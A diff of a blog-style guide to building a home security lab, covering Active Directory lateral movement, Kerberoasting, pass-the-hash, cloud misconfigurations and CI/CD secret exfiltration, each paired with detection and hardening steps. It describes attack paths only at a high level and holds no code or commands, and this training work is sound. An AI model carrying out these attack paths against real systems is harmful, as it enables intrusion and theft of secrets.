-SQLi, XSS, IDOR, SSRF, command injection.
-
-Weak auth/session handling.
-
-Infrastructure Misconfig
-
-Over‑broad IAM roles.
-
-Exposed admin consoles.
-
-Default creds.
-
-Lateral Movement
-
-Pivot via compromised host/container.
-
-Abuse reused keys, tokens, and passwords.
-
-Privilege Escalation
-
-Local misconfig (sudoers, SUID).
-
-Cloud/K8s RBAC escalation.
-
-Data Access & Exfiltration
-
-Find where the “crown jewels” live in your lab.
-
-Prove how an attacker could reach them from a foothold.
-
-For each scenario, write yourself a mini brief:
-
-Entry point:
-
-“You can reach this web app / SSH endpoint.”
-
-Objectives:
-
-“Prove you can read fake ‘customer’ data.”
-
-Rules:
-
-“No automated tools other than X; document steps; think about detection.”
-
-That’s basically CTF creation with a defender’s eye.
-
-Turning Your Lab into a Career Asset
-Don’t just build and forget. Use it:
-
-Keep all configs (Terraform, compose files, manifests) in Git.
-
-Document labs and scenarios in Obsidian or similar:
-
-Architecture diagrams.
-
-Attack paths.
-
-Defences you’d add in real life.
-
-Write public, redacted walkthroughs:
-
-Focused on learning, not copy‑paste exploits.
-
-Great portfolio pieces and material for talks/streams.
-
-If you can explain how you designed your lab, what attacks you simulated, and how you’d detect and prevent those in production, you’re not just “someone who did some boxes” — you’re someone who understands both sides of the fence.
-
-That’s exactly where you want to be.
-
-Bonus Scenario 1: Internal Windows Lab and Lateral Movement
-This is great if you want to understand classic “get a foothold, move sideways, pop the domain” thinking — inside a lab you control.
-
-Build It
-One Windows Server VM:
-
-Acts as DC (AD DS).
-
-A couple of domain users/groups.
-
-One or two Windows 10/11 client VMs:
-
-Joined to the domain.
-
-Different users logged in.
-
-One attacker VM (Kali/Parrot) on the same isolated network, with tools for:
-
-Network recon.
-
-Kerberos abuse.
-
-Pass‑the‑hash style experiments (e.g. Impacket in lab only).
-
-High‑Level Walkthrough
-Recon:
-
-Identify DC and clients with nmap.
-
-Enumerate SMB, RPC, WinRM.
-
-Initial foothold (lab only):
-
-Simulate phishing by manually giving yourself local user creds on a workstation or enabling an easy vuln (e.g. weak local password, RDP from attacker).
-
-Post‑ex on client:
-
-Enumerate:
-
-Logged‑in users.
-
-Mapped drives.
-
-Stored creds (lab: Credential Manager, saved RDP sessions).
-
-Understand where the DC is and what rights your compromised user has.
-
-Lateral movement & escalation (conceptually):
-
-Try to access other machines with the same user.
-
-Observe domain policy (e.g. local admin rights, GPO).
-
-Read about pass‑the‑hash, Kerberoasting, etc., and map where they would fit — but keep practical exploitation inside controlled lab VMs.
-
-Defence thinking:
-
-Least privilege for domain users.
-
-Restrict local admin rights.
-
-Harden DCs and monitoring (Windows event logs, Sysmon, SIEM).
-
-Bonus Scenario 2: Blue‑Team View With Wazuh / Suricata
-Everything you did above can be twice as useful if you can see your own attacks from the defender’s perspective.
-
-Build It
-Wazuh manager or Security Onion VM (or similar).
-
-Suricata sensor on the same network as your victims.
-
-Filebeat/Winlogbeat/agents on your victim VMs.
-
-High‑Level Walkthrough
-Wire up logging:
-
-Send host logs (Linux auth logs, Windows Security) to Wazuh/SIEM.
-
-Send network traffic via Suricata.
-
-Re‑run attacks from previous scenarios:
-
-Web attacks on DVWA/Juice Shop.
-
-Port scans.
-
-Failed logins, successful logins, privilege escalations.
-
-Study the alerts:
-
-Which rules light up?
-
-What is not detected?
-
-How noisy are your scans vs stealthier approaches?
-
-Tune detections:
-
-Write a basic rule to catch something you know you’re doing (e.g. repeated 401s followed by success on a sensitive endpoint).
-
-Refine to reduce false positives.
-
-This makes your lab useful for both red‑team and blue‑team growth.
-
-Bonus Scenario 3: “Micro‑Bounty” Simulation in Cloud
-A nice intermediate step between labs and real bug bounties.
-
-Build It
-Cloud account with a small “mini‑SaaS”:
-
-Simple web app + API.
-
-Auth, profiles, some fake data.
-
-Back it with:
-
-Cloud DB (RDS/Cloud SQL/Cosmos).
-
-Object storage.
-
-A few deliberate issues:
-
-One obvious web vuln.
-
-One subtle auth/IDOR bug.
-
-One cloud misconfig (over‑broad IAM, open bucket in a private VPC).
-
-High‑Level Walkthrough
-Play the external researcher:
-
-Treat it like a real target:
-
-Read “docs” (your own notes).
-
-Map endpoints, auth flows.
-
-Look for:
-
-IDORs.
-
-Insecure direct access to objects.
-
-Poor authz between roles.
-
-Play the internal security engineer:
-
-After you’ve “reported” your own bugs:
-
-Fix them in code/IaC.
-
-Build tests to prevent regression.
-
-Document risk, impact, remediation.
-
-Outcome:
-
-You can truthfully say you:
-
-Built an app.
-
-Found and fixed your own vulnerabilities.
-
-Integrated security into the SDLC.
-
-Perfect portfolio material.
-
-Bonus Scenario 4: CI/CD Pipeline Abuse in Your Lab
-Modern attackers love CI/CD because it’s where code, secrets, and deployment power all live together.
-
-Build It
-Git server (Gitea/GitLab) in your lab.
-
-CI runner (GitLab Runner, Jenkins, etc.).
-
-Pipeline that:
-
-Builds images.
-
-Deploys to your K8s or Docker lab.
-
-Introduce a deliberate misconfig:
-
-Runner with overly broad permissions (e.g. can talk to cluster with cluster-admin).
-
-Secrets in plain text in pipeline variables.
-
-High‑Level Walkthrough
-Normal dev flow:
-
-Push app changes, watch the pipeline build and deploy.
-
-Abuse perspective:
-
-As a “malicious contributor” in your own lab:
-
-Propose a change in .gitlab-ci.yml / pipeline config that exfiltrates secrets or spins up a backdoored pod.
-
-Observe how easy it is to:
-
-Steal secrets.
-
-Run arbitrary code in the CI context.
-
-Reach the cluster from the runner.
-
-Hardening:
-
-Lock down runner permissions.
-
-Use separate runners for untrusted code.
-
-Remove secrets from pipelines; use vaults and short‑lived tokens.
-
-Wrap‑Up: What to Do Next
-Now that your lab blueprint is sketched out:
-
-Start small:
-
-One attacker VM + one vulnerable web app.
-
-One cloud VPC with a single vulnerable instance.
-
-Add:
-
-Containers.
-
-K8s.
-
-Monitoring.
-
-CI/CD.
-
-For each new piece, define at least one:
-
-Attack path.
-
-Detection method.
-
-Hardening action.
-
-If you can sit down with someone and walk them through:
-
-How your lab is built.
-
-How you attack a given scenario.
-
-How you’d detect and prevent that in production.
-
-…you’re already operating at the level of a genuinely dangerous (in a good way) security engineer and future security leader.
+If you can sit down with someone and walk them through how your lab is built, how you attack a given scenario, and how you'd detect and prevent that in production, you're already operating at the level of a genuinely dangerous (in the good way) security engineer.
 
 <img src="img/authors/geeky.jpg" width="40"/>
